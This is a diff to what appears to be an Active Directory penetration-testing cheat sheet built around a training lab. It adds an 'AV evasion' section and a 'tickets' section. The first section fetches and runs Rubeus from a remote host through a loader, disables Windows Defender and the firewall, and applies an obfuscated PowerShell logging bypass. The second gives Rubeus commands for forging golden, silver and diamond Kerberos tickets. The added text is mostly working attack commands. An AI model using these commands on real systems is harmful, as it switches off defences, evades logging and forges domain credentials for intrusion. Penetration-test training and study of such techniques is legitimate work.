@@ -55,7 +55,9 @@
   * <<ToSystem, ToSystem>>
 - <<amsi, AMSI>>
 - <<post-exploatation, post-exploatation>>
+- <<av, AV evasion>>
 - <<trust, Domain Trusts>>
+- <<tickets,Golden,Silver,Diamond tickets generation>>
 - <<stuck, Stucked>>
 
 [[overview]]
@@ -1792,6 +1794,38 @@ wireshark -r WS-01_PktMon.pcap
 
 You need to find moslty some auth packet to catch cleartext creds or hashes. It's working with all `.pcap` files 
 
+[[av]]
+== AV evasion
+
+Use Obfuscated and Transformated scripts like in CRTP course. `Loader.exe` it's a great tool for loading malicious .exe files 
+
+Just an example
+
+```bash
+.\Loader.exe -path http://172.16.100.14/Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:
+```
+
+If we got a Administrator in target machine we can disable a AV temponary in `Windows Defender`
+
+```bash
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Also firewall can be disabled in `Windows Defender Firewall` 
+
+```bash
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+SBLoggingBypass
+
+```bash
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
+```
+
+
+
 [[trust]]
 == Domain Trusts
 
@@ -1855,6 +1889,28 @@ Returns `base64(ticket.kirbi)`
 Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:output_of_ticket_base64
 ```
 
+[[tickets]]
+== Golden,Silver,Diamond tickets generation
+
+Golden
+
+```bash
+Rubeus.exe -args evasive-golden /aes256:krbtgt_hash /sid:domain_SID /ldap /user:impersonated_user /printcmd
+```
+
+Then use output to forge a ticket
+
+Silver
+
+```bash
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:service_name/computer_name.dollarcorp.moneycorp.local /rc4:trust_key /sid:domain_SID /ldap /user:user_to_impersonate /domain:dollarcorp.moneycorp.local /ptt
+```
+
+Diamond
+
+```bash
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:krbtgt_hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
 
 [[stuck]]
 == Stuck
